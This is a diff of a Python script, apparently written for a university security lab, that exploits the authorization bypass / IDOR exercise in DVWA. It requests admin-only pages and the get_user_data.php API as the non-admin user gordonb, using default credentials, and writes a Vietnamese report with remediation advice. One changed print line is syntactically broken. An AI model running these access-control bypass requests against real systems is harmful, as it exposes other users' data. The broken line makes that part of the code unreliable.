@@ -110,7 +110,7 @@ class DVVAAuthBypassExploiter:
         return False
     
     def test_low_security(self, username):
-        """Test cấp độ LOW - Theo tài liệu PDF"""
+        """Test cấp độ LOW"""
         print(f"\n{Fore.CYAN}{'='*80}")
         print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ LOW - User: {username}")
         print(f"{Fore.CYAN}{'='*80}")
@@ -124,11 +124,11 @@ class DVVAAuthBypassExploiter:
         if 'Authorization Bypass' in response.text:
             print(f"{Fore.GREEN}[+] Có menu 'Authorization Bypass'")
         else:
-            print(f"{Fore.YELLOW}[-] Không có menu 'Authorization Bypass' (đúng với user không phải admin)")
+            print(f"{Fore.YELLOW}[-] Không có menu 'Authorization Bypass'")
         
         print(f"\n{Fore.WHITE}[Bước 2] Truy cập trực tiếp /vulnerabilities/authbypass/")
         
-        # Theo PDF: "Một cách để truy cập vào thư mục này là thông qua lỗ hồng IDOR"
+        # Một cách để truy cập vào thư mục này là thông qua lỗ hồng IDOR
         authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
         response = self.session.get(authbypass_url, timeout=5)
         
@@ -181,7 +181,7 @@ class DVVAAuthBypassExploiter:
                     print(f"  Input: {name} = {value}")
     
     def test_medium_security(self, username):
-        """Test cấp độ MEDIUM - Theo tài liệu PDF"""
+        """Test cấp độ MEDIUM"""
         print(f"\n{Fore.CYAN}{'='*80}")
         print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ MEDIUM - User: {username}")
         print(f"{Fore.CYAN}{'='*80}")
@@ -189,7 +189,7 @@ class DVVAAuthBypassExploiter:
         print(f"\n{Fore.WHITE}[Bước 1] Đặt security level = medium")
         self.set_security_level("medium")
         
-        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra truy cập trực tiếp (sẽ bị chặn)")
+        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra truy cập trực tiếp")
         
         authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
         response = self.session.get(authbypass_url, timeout=5)
@@ -198,11 +198,11 @@ class DVVAAuthBypassExploiter:
         print(f"Status: HTTP {response.status_code}")
         
         if response.status_code != 200:
-            print(f"{Fore.YELLOW}[-] Truy cập trực tiếp bị chặn (đúng như PDF)")
+            print(f"{Fore.YELLOW}[-] Truy cập trực tiếp bị chặn")
         
-        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra file get_user_data.php (IDOR khác)")
+        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra file get_user_data.php")
         
-        # Theo PDF: "Hãy kiểm tra xem gordonb có thể truy cập vào tệp dữ liệu thay vì thư mục hay không"
+        # Hãy kiểm tra xem gordonb có thể truy cập vào tệp dữ liệu thay vì thư mục hay không
         user_data_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
         response = self.session.get(user_data_url, timeout=5)
         
@@ -392,7 +392,7 @@ class DVVAAuthBypassExploiter:
     
     def test_api_endpoints(self):
         """Test các API endpoints khác"""
-        print(f"\n{Fore.WHITE}[*] Testing other API endpoints...")
+        print(f"\n{Fore.WHITE}[*] Test các API endpoints...")
         
         endpoints = [
             "/vulnerabilities/authbypass/get_user_data.php?id=1",
@@ -437,7 +437,7 @@ class DVVAAuthBypassExploiter:
         self.print_banner()
         
         print(f"\n{Fore.WHITE}Target URL: {self.base_url}")
-        print(f"{Fore.WHITE}Testing based on Lab5.14 PDF")
+        print(f"{Fore.WHITE}Testing based on Document"T
         
         results = {
             'low_level': False,
@@ -495,20 +495,24 @@ class DVVAAuthBypassExploiter:
         print(f"{Fore.YELLOW}RECOMMENDATIONS")
         print(f"{Fore.CYAN}{'='*80}")
         
-        print(f"\n{Fore.WHITE}1. LOW Level Fix:")
-        print(f"   - Implement server-side authorization checks")
-        print(f"   - Don't rely on client-side menu visibility")
-        print(f"   - Check user role before accessing admin pages")
+        print(f"\n{Fore.WHITE}1. Khắc phục cấp độ LOW:")
+        print(f"   - Triển khai kiểm tra ủy quyền phía máy chủ (server-side)")
+        print(f"   - Không chỉ dựa vào việc ẩn/hiện menu phía client")
+        print(f"   - Kiểm tra vai trò người dùng trước khi truy cập trang admin")
         
-        print(f"\n{Fore.WHITE}2. MEDIUM Level Fix:")
-        print(f"   - Secure all API endpoints, not just HTML pages")
-        print(f"   - Implement proper access control on data APIs")
-        print(f"   - Use authentication tokens for API calls")
+        print(f"\n{Fore.WHITE}2. Khắc phục cấp độ MEDIUM:")
+        print(f"   - Bảo mật tất cả các endpoint API, không chỉ trang HTML")
+        print(f"   - Triển khai kiểm soát truy cập đúng cách cho các API dữ liệu")
+        print(f"   - Sử dụng token xác thực cho các lệnh gọi API")
         
-        print(f"\n{Fore.WHITE}3. General IDOR Prevention:")
-        print(f"   - Use indirect object references (UUIDs instead of sequential IDs)")
-        print(f"   - Implement proper session management")
-        print(f"   - Log all access attempts to sensitive endpoints")
+        print(f"\n{Fore.WHITE}3. Phòng ngừa IDOR nói chung:")
+        print(f"   - Sử dụng tham chiếu đối tượng gián tiếp (UUID thay vì ID tuần tự)")
+        print(f"   - Triển khai quản lý phiên (session) đúng cách")
+        print(f"   - Ghi nhật ký tất cả các lần truy cập vào endpoint nhạy cảm")
+        print(f"   - Xác thực quyền truy cập cho từng request, không dựa vào tham số client")
+        print(f"   - Áp dụng nguyên tắc đặc quyền tối thiểu (least privilege)")
+        print(f"   - Kiểm tra đầu vào và sử dụng whitelist cho các giá trị được phép")
+        print(f"   - Mã hóa hoặc hash các tham chiếu đối tượng khi truyền tải")
         
         # Save report to file
         report_file = f"dvwa_authbypass_report_{int(time.time())}.txt"
@@ -526,32 +530,72 @@ class DVVAAuthBypassExploiter:
             f.write(f"LOW Level: {'VULNERABLE' if results.get('low_level') else 'SECURE'}\n")
             f.write(f"MEDIUM Level: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}\n\n")
             
-            f.write("VULNERABILITIES FOUND:\n")
+            f.write("ĐÃ TÌM THẤY LỖ HỔNG:\n")
             f.write("-"*40 + "\n")
             
             if results.get('low_level'):
-                f.write("1. LOW Level: Direct access to /vulnerabilities/authbypass/\n")
-                f.write("   Impact: Non-admin users can access admin-only pages\n")
-                f.write("   Fix: Implement server-side authorization checks\n\n")
+                f.write("1. CẤP ĐỘ LOW: Truy cập trực tiếp /vulnerabilities/authbypass/\n")
+                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể truy cập trang chỉ dành cho admin\n")
+                f.write("   Tác động: Vi phạm tính bảo mật, lộ thông tin nhạy cảm, mất kiểm soát truy cập\n")
+                f.write("   Nguyên nhân: Thiếu kiểm tra ủy quyền phía máy chủ, chỉ dựa vào ẩn menu client-side\n")
+                f.write("   Cách khắc phục:\n")
+                f.write("   - Triển khai kiểm tra ủy quyền phía máy chủ cho tất cả endpoints\n")
+                f.write("   - Xác minh vai trò người dùng trước khi hiển thị nội dung\n")
+                f.write("   - Sử dụng session-based authorization thay vì dựa vào URL parameters\n\n")
             
             if results.get('medium_level'):
-                f.write("2. MEDIUM Level: Access to get_user_data.php API\n")
-                f.write("   Impact: Non-admin users can retrieve sensitive user data\n")
-                f.write("   Fix: Secure API endpoints with proper authentication\n\n")
+                f.write("2. CẤP ĐỘ MEDIUM: Truy cập API get_user_data.php\n")
+                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể truy xuất dữ liệu người dùng nhạy cảm\n")
+                f.write("   Tác động: Rò rỉ dữ liệu cá nhân (PII), vi phạm quyền riêng tư\n")
+                f.write("   Nguyên nhân: API endpoint không được bảo vệ, thiếu authentication/authorization\n")
+                f.write("   Cách khắc phục:\n")
+                f.write("   - Bảo mật tất cả API endpoints với proper authentication\n")
+                f.write("   - Implement access control cho từng API call\n")
+                f.write("   - Sử dụng JWT tokens hoặc session validation cho API requests\n\n")
+
             
-            f.write("TEST METHODOLOGY:\n")
-            f.write("-"*40 + "\n")
-            f.write("1. Login as non-admin user (gordonb/abc123)\n")
-            f.write("2. Attempt direct access to admin pages\n")
-            f.write("3. Test API endpoints for IDOR vulnerabilities\n")
-            f.write("4. Check for missing authorization checks\n")
+            f.write("PHƯƠNG PHÁP KIỂM THỬ:\n")
+            f.write("-"*50 + "\n")
+            f.write("1. Đăng nhập với tài khoản non-admin (gordonb/abc123)\n")
+            f.write("2. Thử truy cập trực tiếp vào các trang admin-only\n")
+            f.write("3. Kiểm tra các API endpoints cho lỗ hổng IDOR\n")
+            f.write("4. Xác minh các kiểm tra ủy quyền bị thiếu\n")
+            f.write("5. So sánh quyền truy cập giữa admin và non-admin users\n")
+            f.write("6. Test với các payload IDOR khác nhau (numeric IDs, SQLi, etc.)\n\n")
+
+            f.write("MỨC ĐỘ NGUY HIỂM:\n")
+            f.write("-"*50 + "\n")
+            if results.get('low_level'):
+                f.write("CẤP ĐỘ LOW: CAO\n")
+                f.write("- Cho phép truy cập trái phép vào chức năng quản trị\n")
+                f.write("- Có thể dẫn đến leo thang đặc quyền\n")
+                f.write("- Vi phạm tính toàn vẹn của hệ thống\n\n")
+
+            if results.get('medium_level'):
+                f.write("CẤP ĐỘ MEDIUM: CAO\n")
+                f.write("- Rò rỉ thông tin người dùng nhạy cảm\n")
+                f.write("- Vi phạm các quy định về bảo vệ dữ liệu (GDPR, PDPA)\n")
+                f.write("- Có thể kết hợp với các lỗ hổng khác để tấn công\n\n")
+
+            f.write("KHUYẾN NGHỊ ƯU TIÊN:\n")
+            f.write("-"*50 + "\n")
+            f.write("1. ƯU TIÊN CAO: Khắc phục ngay lập tức\n")
+            f.write("   - Triển khai server-side authorization checks\n")
+            f.write("   - Bảo mật tất cả API endpoints\n")
+            f.write("   - Review và fix tất cả access control logic\n\n")
+            
+            f.write("2. KIỂM TRA BỔ SUNG CẦN THỰC HIỆN:\n")
+            f.write("   - Kiểm tra các endpoints khác có pattern tương tự\n")
+            f.write("   - Test với các user roles khác nhau\n")
+            f.write("   - Kiểm tra business logic flows cho missing authorization\n")
+            f.write("   - Review code cho tất cả file trong thư mục vulnerabilities/\n")
         
         print(f"\n{Fore.GREEN}[+] Report saved to: {report_file}")
 
 def main():
     """Main function"""
     parser = argparse.ArgumentParser(description='DVWA Authorization Bypass IDOR Exploiter')
-    parser.add_argument('-u', '--url', required=True, help='DVWA base URL (e.g., http://localhost:8000)')
+    parser.add_argument('-u', '--url', required=True, help='DVWA base URL (e.g., http://localhost:42001)')
     parser.add_argument('-l', '--level', choices=['low', 'medium', 'all'], default='all', 
                        help='Security level to test (low, medium, all)')
     
